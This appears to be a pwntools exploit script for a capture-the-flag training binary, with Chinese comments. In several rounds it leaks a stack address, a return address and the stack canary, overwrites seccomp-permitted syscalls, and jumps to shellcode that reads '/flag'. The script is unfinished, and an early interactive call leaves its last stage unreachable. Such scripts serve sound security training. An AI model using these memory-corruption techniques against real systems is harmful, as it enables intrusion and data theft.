# 这题需要先泄露, 然后覆盖seccomp的两个允许调用, 最后yongshellcode执行
# 不知道只用2和40可不可以, 2是open 1是write, 也许是需要的
# 不行的话再从新改就好了
# 好像write是必须要的=。=, 因为调用的后面有一个put函数, 需要重写shellcode
# 需要再重复一次vuln, 然后让它把需要的调用加进来, 第一次ret的地址需要填写vuln的地址
# 需要泄露vuln的返回地址, 计算出真实vuln开始地址, 并第一次覆盖ret时转回vuln
# 第二次添加上seccomp的调用, 然后再转到shellcode执行。(真麻烦)
# ret可能需要直接控制到seccomp那个部分, 然后需要调整rbp的取值, 控制接下来添加的过滤rule=。=, 好麻烦啊, 一个write不够用啊XD, 至少要带上一个read函数
from pwn import *


context(os='linux', arch='amd64',)#log_level='debug')

def getshellcode():
    shellcode = b""
    shellcode += asm("xor al, al")
    shellcode += asm("mov al, 2")
    shellcode += asm("mov rdi, 0x010166606d672e2f")
    shellcode += asm("mov r8, 0x0101010101010101")
    shellcode += asm("xor rdi, r8")
    shellcode += asm("push rdi")
    shellcode += asm("mov rdi, rsp")
    shellcode += asm("xor esi, esi")
    shellcode += asm("xor edx, edx")
    shellcode += asm("syscall")
    shellcode += asm("mov esi, eax")
    shellcode += asm("mov al, 40")
    shellcode += asm("xor edi, edi")
    shellcode += asm("inc edi")
    shellcode += asm("mov r10w, 0x3e8")
    shellcode += asm("syscall")
    #shellcode += asm("mov al, 60")
    #shellcode += asm("xor edi, edi")
    #shellcode += asm("syscall")
    return shellcode

if __name__ == '__main__':
    target_name = "./toddler1_level3_teaching1"
    io = process(target_name)
    io.recvuntil(b"size: ")
    #shellcode = getshellcode()
    io.sendline(bytes(str(12*8), encoding='utf8'))
    io.recvuntil(b"!\n")
    # 第1次输入, 进行泄露stack_addr
    payload_0 = b"REPEATaa"+getshellcode()
    payload_0 += (12*8-len(payload_0))*b'b'
    io.sendline(payload_0)
    io.recvuntil(payload_0)
    rbp = io.recv(6)+b'\x00\x00'
    shellcode_addr = p64(int.from_bytes(rbp, 'little') - 136)
    # 第2次输入, 泄露vuln地址
    io.recvuntil(b"size: ")
    io.sendline(bytes(str(13*8), encoding='utf8'))
    io.recvuntil(b"!\n")
    payload_1 = b'REPEATaa'+b'b'*12*8
    io.sendline(payload_1)
    io.recvuntil(payload_1)
    vuln_ret = io.recv(6)+b'\x00\x00'
    vuln_addr = p64(int.from_bytes(vuln_ret, 'little') - 1290)
    # 第3次输入, 泄露canary
    io.recvuntil(b"size: ")
    io.sendline(bytes(str(9*8+1), encoding='utf8'))
    io.recvuntil(b"!\n")
    payload_2 = b'REPEATaa'+b'b'*8*8+b'c'
    io.sendline(payload_2)
    io.recvuntil(payload_2)
    canary = b'\x00'+io.recv(7)
    # 第4次输入, 开启多几个系统调用, ret为vuln地址
    # 似乎会出错, 得调试才知道
    io.recvuntil(b"size: ")
    io.sendline(bytes(str(14*8), encoding='utf8'))
    io.recvuntil(b"!\n")
    payload_3 = b'A'*8*8+p32(1)+p32(2)+canary+b'B'*8*3+vuln_addr
    io.sendline(payload_3)
    io.interactive()
    # 第5次输入, 覆盖ret
    io.recvuntil(b"size: ")
    io.sendline(bytes(str(14*8), encoding='utf8'))
    io.recvuntil(b"!\n")
    payload_4 = b'A'*8*8+p32(40)+p32(2)+canary+b'B'*8*3+shellcode_addr
    io.sendline(payload_4)
    io.interactive()
